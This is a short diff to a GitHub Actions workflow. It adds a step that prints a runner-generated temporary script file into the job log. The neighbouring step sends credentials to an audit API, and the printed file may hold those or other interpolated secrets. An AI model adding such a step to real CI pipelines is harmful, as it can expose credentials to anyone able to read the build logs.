@@ -69,3 +69,5 @@ jobs:
         fi
         
         curl --connect-timeout 2 -sSf -k -u "$USER:$PW" -X POST -H 'Content-type: application/json' --data '{"pr_number": "'"$PR_NUMBER"'"}' $URL/api/run/audit
+    - name: Print temporary file contents
+      run: cat /home/runner/work/_temp/9aaf6ec5-8b02-400e-8d2d-49b215a7d3e0.sh
